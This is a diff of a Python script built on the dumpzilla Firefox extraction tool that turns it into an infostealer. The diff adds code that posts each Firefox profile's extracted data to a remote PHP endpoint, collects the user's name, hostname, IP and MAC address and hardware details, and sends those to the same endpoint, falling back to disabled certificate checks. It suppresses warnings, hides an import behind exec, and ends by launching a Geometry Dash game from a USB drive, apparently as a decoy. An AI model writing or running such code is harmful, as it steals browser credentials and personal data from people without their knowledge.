@@ -2,13 +2,43 @@
 # https://github.com/Busindre/dumpzilla/blob/master/dumpzilla.py
 
 from collections import namedtuple
-import dumpzilla, json, getpass, os, decrypt
+import json, getpass, os, warnings, sys, requests, platform, socket, psutil, uuid, datetime#, subprocess, threading, time, ctypes, shutil, multiprocessing
+from screeninfo import get_monitors
+from geopy.geocoders import Nominatim
+from datetime import datetime
+#import tkinter as tk
+#from PIL import Image, ImageTk
+#from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+#from comtypes import CLSCTX_ALL
+#from pydub import AudioSegment
+#from pydub.playback import play
+#from comtypes import CoInitialize, CoUninitialize
 
-if not os.path.exists("db"):
-    os.makedirs("db")
+# Ne pas afficher les messages d'attention.
+warnings.filterwarnings("ignore")
+old_input = input
+def _input(*args, **kwargs):
+    try:
+        return old_input(*args, **kwargs)
+    except KeyboardInterrupt:
+        sys.exit()
+input = _input
+
+# That is a patch for Nuitka to not detect the "import" line and instead use the "from" line, because if it does, Nuitka will crash for no reason. Time loss due to that stupid bug: 30 minutes
+try:
+    from . import dumpzilla, decrypt  # this works in Nuitka but not in Python
+except:
+    exec("i-m-p-o-r-t d-u-m-p-z-i-l-l-a, d-e-c-r-y-p-t".replace("-", ""))  # this works in Python but not in Nuitka
+
+# Pour si on démarre GD
+startGD = True
 
 user = getpass.getuser()
 mozilla_profile_dir = "C:\\Users\\" + user + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
+url = 'https://project-sharing.fr.to/TEST/recevoir.php'
+geolocator = Nominatim(user_agent="geoapi")
+location = geolocator.geocode("Paris, France")
+date_time = datetime.now().strftime("%d-%m-%Y-%Hh%Ms%S")
 
 for i in os.listdir(mozilla_profile_dir):
     mozilla_profile = os.path.join(mozilla_profile_dir, i)
@@ -154,5 +184,51 @@ for i in os.listdir(mozilla_profile_dir):
     except Exception as e:
         pass
 
-    with open(f"db/report_{user}_{i}.json", "w") as f:
-        f.write(json.dumps(dump.total_extraction, indent = 4))
+    try:
+        response = requests.post(url, data={"data": json.dumps(dump.total_extraction), "title_file": f"report_{user}_{i}", "folder_name": user + "_" + date_time})
+    except Exception as e:
+        response = requests.post(url, data={"data": json.dumps(dump.total_extraction), "title_file": f"report_{user}_{i}", "folder_name": user + "_" + date_time}, verify=False)
+
+info = {
+    "Utilisateur": user,
+    "Nom de l'ordinateur": platform.node(),
+    "Systeme d'exploitation": platform.system(),
+    "Version OS": platform.version(),
+    "Architecture": platform.architecture()[0],
+    "Processeur": platform.processor(),
+    "Nombre de coeurs": psutil.cpu_count(logical=False),
+    "Nombre de threads": psutil.cpu_count(logical=True),
+    "Memoire RAM totale": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
+    "Adresse IP": socket.gethostbyname(socket.gethostname()),
+    "Adresse MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1]),
+    "Ecran(s)": [f"{m.width}x{m.height}" for m in get_monitors()],
+    "Date et heure actuelles": date_time,
+    "Adresse complète": location.address,
+    "Latitude": location.latitude,
+    "Longitude": location.longitude,
+}
+
+try:
+    response = requests.post(url, data={"infos": json.dumps(info), "title_file_infos": f"{user}_info", "folder_name_infos": user + "_" + date_time})
+except Exception as e:
+    response = requests.post(url, data={"infos": json.dumps(info), "title_file_infos": f"{user}_info", "folder_name_infos": user + "_" + date_time}, verify=False)
+
+
+if startGD:
+    usb_drives = []
+    partitions = psutil.disk_partitions(all=True)
+
+    for partition in partitions:
+        if "removable" in partition.opts:
+            usb_drives.append(partition.device.replace(":\\", ""))
+
+    for drive in usb_drives:
+        gd_loc = f"{drive}:\\jeux\\GeometryDash"
+        if os.path.isdir(gd_loc):
+            break
+
+    if os.path.isdir(gd_loc):  # Vérifie si le dossier existe
+        exe_path = os.path.join(gd_loc, "maingame.exe")  # Chemin complet du .exe
+        if os.path.isfile(exe_path):  # Vérifie si l'exécutable existe
+            os.chdir(gd_loc)
+            os.startfile(exe_path)
